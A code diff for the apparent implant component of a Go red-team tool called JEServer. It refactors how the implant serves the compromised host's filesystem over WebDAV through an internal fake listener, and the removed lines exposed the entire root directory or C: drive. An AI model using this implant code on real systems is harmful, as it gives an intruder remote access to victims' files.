@@ -6,7 +6,7 @@ package main
  * Implant side of JEServer
  * By J. Stuart McMurray
  * Created 20220326
- * Last Modified 20220402
+ * Last Modified 20220410
  */
 
 import (
@@ -17,12 +17,10 @@ import (
 	"io"
 	"net/http"
 	"os"
-	"runtime"
 	"strings"
 	"sync"
 
 	"golang.org/x/crypto/ssh"
-	"golang.org/x/net/webdav"
 )
 
 var (
@@ -82,19 +80,12 @@ func main() {
 	PrivKey = "" /* It's a try, anyways. */
 
 	/* Start a WebDAV server. */
-	var wdDir = "/"
 	WDListener = NewFakeListener("webdav", "internal")
-	if "windows" == runtime.GOOS {
-		wdDir = `C:\` /* Just enough, I guess? */
-	}
 	go func() {
 		Logf(
 			"Error serving WebDAV: %s",
 			(&http.Server{
-				Handler: &webdav.Handler{
-					FileSystem: webdav.Dir(wdDir),
-					LockSystem: webdav.NewMemLS(),
-				},
+				Handler:  WebDAVHandler(),
 				ErrorLog: NewWebDAVLogger(),
 			}).Serve(WDListener),
 		)
